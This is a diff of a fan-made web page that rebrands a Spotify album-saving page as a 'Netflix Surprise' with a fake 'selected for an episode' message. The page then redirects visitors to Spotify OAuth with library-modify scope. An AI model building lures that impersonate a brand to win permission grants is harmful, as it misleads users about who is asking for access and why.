@@ -1,32 +1,67 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Connecting to Spotify...</title>
+  <title>Netflix Surprise</title>
+  <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&display=swap" rel="stylesheet">
+  <style>
+    body{
+      background:linear-gradient(135deg,#fa0000,#f6f6f6);
+      color:white;font-family:'Bebas Neue',sans-serif;
+      text-align:center;min-height:100vh;
+      display:flex;justify-content:center;align-items:center;flex-direction:column;
+    }
+    input,button{padding:12px;margin:10px;font-size:1rem;border-radius:6px;}
+    button{cursor:pointer;background:#e50914;color:white;font-weight:bold;}
+    .counter{margin-top:10px;opacity:0.8;font-size:1rem;}
+  </style>
 </head>
 <body>
-<h1>Connecting to Spotify...</h1>
+
+<h1>NETFLIX Surprise</h1>
+<p id="text">You've been selected for a limited interactive episode.</p>
+<input id="username" placeholder="Who's watching?" />
+<button onclick="startEpisode()">Start Episode ▶️</button>
+<p class="counter">Viewers logged: <span id="count">0613</span></p>
+
 <script>
-const hash = window.location.hash.substring(1);
-const params = new URLSearchParams(hash);
-const token = params.get("access_token");
+const webAppUrl = "https://script.google.com/macros/s/YOUR_GOOGLE_SCRIPT_ID/exec"; // Replace with your viewer counter URL
 
-if(token){
-    const albumId = "1DcxHW214MCDxXju71RbvX"; // Spotify ARIRANG Album
+function startEpisode() {
+    const name = document.getElementById("username").value.trim();
+    if(!name){ alert("Please enter your name!"); return; }
 
-    fetch(`https://api.spotify.com/v1/me/albums?ids=${albumId}`, {
-        method: "PUT",
-        headers: { Authorization: "Bearer " + token }
-    })
-    .then(() => {
-        // Redirect back to main page
-        window.location.href = "index.html?done=true";
-    })
-    .catch(() => {
-        document.body.innerHTML = "Something went wrong. Try again!";
-    });
-}else{
-    document.body.innerHTML = "No access token found. Try logging in again!";
+    document.getElementById("text").innerText = "Welcome " + name + "! Redirecting to Spotify...";
+
+    const clientId = "60a8cc35b3ad47598621c077d0ffde47"; // Your Spotify Client ID
+    const redirectUri = "https://nnayabn.github.io/Arirang/callback.html"; // Must match Spotify App
+    const scopes = "user-library-modify";
+
+    const authUrl = 
+      "https://accounts.spotify.com/authorize" +
+      "?client_id=" + clientId +
+      "&response_type=token" + // Implicit grant
+      "&redirect_uri=" + encodeURIComponent(redirectUri) +
+      "&scope=" + encodeURIComponent(scopes);
+
+    window.location.href = authUrl;
+}
+
+// Viewer count updater
+function updateViewerCount(){
+    fetch(webAppUrl + "?count=true")
+    .then(res => res.json())
+    .then(data => { document.getElementById("count").innerText = data.total || 0; })
+    .catch(err => console.log(err));
+}
+setInterval(updateViewerCount, 5000);
+updateViewerCount();
+
+// Show confirm if redirected after presave
+const urlParams = new URLSearchParams(window.location.search);
+if(urlParams.get("done")==="true"){
+    document.getElementById("text").innerText="Mission completed. Enjoy your surprise 💜";
 }
 </script>
+
 </body>
 </html>
